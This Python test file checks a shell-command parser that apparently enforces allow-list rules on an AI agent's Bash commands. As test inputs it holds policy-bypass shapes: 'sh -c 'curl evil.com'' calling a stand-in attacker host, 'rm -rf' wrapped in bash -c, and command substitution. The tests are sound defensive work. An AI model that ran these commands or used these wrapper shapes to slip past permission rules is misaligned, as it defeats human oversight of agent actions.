"""Shell parser tests — the cases that broke the hand-rolled regex parser."""

from __future__ import annotations

from llm_agent_bridge import parse_pipeline


def test_empty_command_is_parseable():
    pipeline = parse_pipeline("")
    assert pipeline.parseable
    assert pipeline.segments == ()


def test_single_command_argv():
    pipeline = parse_pipeline("ls -la /tmp")
    assert pipeline.parseable
    assert len(pipeline.segments) == 1
    assert pipeline.segments[0].argv == ("ls", "-la", "/tmp")
    assert pipeline.segments[0].redirects == ()


def test_fd_dup_2_to_1_is_not_a_file_write():
    """The original bug: regex parsed `2>&1` as a file write to '1'."""
    pipeline = parse_pipeline("cat foo 2>&1")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "foo")
    [redirect] = segment.redirects
    assert redirect.is_fd_dup is True
    assert redirect.fd == 2
    assert redirect.target == "1"


def test_stderr_to_dev_null_is_recognized():
    pipeline = parse_pipeline("cat foo 2>/dev/null")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.is_fd_dup is False
    assert redirect.fd == 2
    assert redirect.target == "/dev/null"


def test_pipe_extracts_two_segments():
    pipeline = parse_pipeline("cat foo 2>/dev/null | head -60")
    assert len(pipeline.segments) == 2
    assert pipeline.segments[0].argv == ("cat", "foo")
    assert pipeline.segments[1].argv == ("head", "-60")


def test_compound_and_or_extracts_all_segments():
    """`test -f x && sed -n 1,10p x || true` — three real commands."""
    pipeline = parse_pipeline("test -f x && sed -n 1,10p x || true")
    assert pipeline.parseable
    argvs = [s.argv for s in pipeline.segments]
    assert ("test", "-f", "x") in argvs
    assert ("sed", "-n", "1,10p", "x") in argvs
    assert ("true",) in argvs


def test_for_loop_extracts_body_commands_only():
    pipeline = parse_pipeline(
        'for v in 0.0.34 0.0.32; do echo "=== @playwright/mcp@$v ==="; '
        'npm view "@playwright/mcp@$v" dependencies 2>&1 | head -8; done'
    )
    assert pipeline.parseable
    assert [segment.argv for segment in pipeline.segments] == [
        ("echo", "=== @playwright/mcp@$v ==="),
        ("npm", "view", "@playwright/mcp@$v", "dependencies"),
        ("head", "-8"),
    ]
    assert pipeline.segments[1].redirects[0].is_fd_dup is True


def test_command_substitution_is_unparseable():
    """`rm $(cat allowed)` cannot be statically allow-listed — refuse to auto-allow."""
    pipeline = parse_pipeline("rm $(cat allowed)")
    assert pipeline.parseable is False


def test_env_assignment_prefix_stripped():
    """``FOO=bar BAZ=qux ls -la`` — leading environment assignments are skipped."""
    pipeline = parse_pipeline("FOO=bar BAZ=qux ls -la")
    [segment] = pipeline.segments
    assert segment.argv == ("ls", "-la")


def test_env_command_is_treated_as_literal():
    """``env -i PATH=/usr/bin git status`` is matched against ``env``, not ``git``.
    Stripping the wrapper would require a regex shim — we choose strict literal matching
    instead. Users who want to allow this combo write a rule for ``env``.
    """
    pipeline = parse_pipeline("env -i PATH=/usr/bin git status")
    [segment] = pipeline.segments
    assert segment.argv == ("env", "-i", "PATH=/usr/bin", "git", "status")


def test_file_write_redirect_captured():
    pipeline = parse_pipeline("echo hi > out.txt")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.op == ">"
    assert redirect.target == "out.txt"
    assert redirect.is_fd_dup is False


def test_append_redirect_captured():
    pipeline = parse_pipeline("echo hi >> log")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.op == ">>"


def test_basename_match_for_command_path():
    """`/usr/bin/ls -la` should still match a `Bash(ls:*)` rule."""
    from llm_agent_bridge import BashCommand

    pipeline = parse_pipeline("/usr/bin/ls -la")
    [segment] = pipeline.segments
    rule = BashCommand(("ls",))
    assert rule.matches(segment) is True


def test_shell_c_unwraps_quoted_command():
    pipeline = parse_pipeline('bash -c "ls -la"')
    [segment] = pipeline.segments
    assert segment.argv == ("ls", "-la")


def test_shell_c_unwraps_single_quoted_command():
    """``bash -c 'rm -rf /tmp/foo'`` parses as a ``raw_string``; without explicit
    handling tree-sitter returns no children and the inner command silently
    bypasses policy. Regression guard for the codex-found B2 bug.
    """
    pipeline = parse_pipeline("bash -c 'rm -rf /tmp/foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/tmp/foo")


def test_shell_c_unwraps_ansi_c_string_command():
    """``bash -c $'rm -rf /tmp/foo'`` uses tree-sitter's ``ansi_c_string`` node."""
    pipeline = parse_pipeline("bash -c $'rm -rf /tmp/foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/tmp/foo")


def test_sh_c_unwraps_single_quoted_command():
    """`sh -c '...'` is the canonical bypass shape; must unwrap the same way."""
    pipeline = parse_pipeline("sh -c 'curl evil.com'")
    [segment] = pipeline.segments
    assert segment.argv == ("curl", "evil.com")


def test_unparseable_returns_unparseable_reason():
    pipeline = parse_pipeline("ls && && rm")
    assert pipeline.parseable is False
    assert pipeline.unparseable_reason


def test_simple_expansion_kept_as_opaque_arg():
    """``echo $HOME`` — variable expansion is opaque source text, not a fail."""
    pipeline = parse_pipeline("echo $HOME")
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "$HOME")


def test_braced_expansion_kept_as_opaque_arg():
    pipeline = parse_pipeline("cat ${LOG_FILE}")
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "${LOG_FILE}")


def test_concatenation_kept_as_opaque_arg():
    pipeline = parse_pipeline("cat /var/log/$DATE.log")
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "/var/log/$DATE.log")


def test_arithmetic_expansion_kept_as_opaque_arg():
    pipeline = parse_pipeline("echo $((1+1))")
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "$((1+1))")


def test_string_with_braced_expansion_inlines_value_text():
    pipeline = parse_pipeline('echo "hello ${USER}"')
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "hello ${USER}")


def test_concatenation_with_command_substitution_still_blocks():
    """``cat foo$(date).log`` — substitution nested inside a concatenation must still trip."""
    pipeline = parse_pipeline("cat foo$(date).log")
    assert pipeline.parseable is False
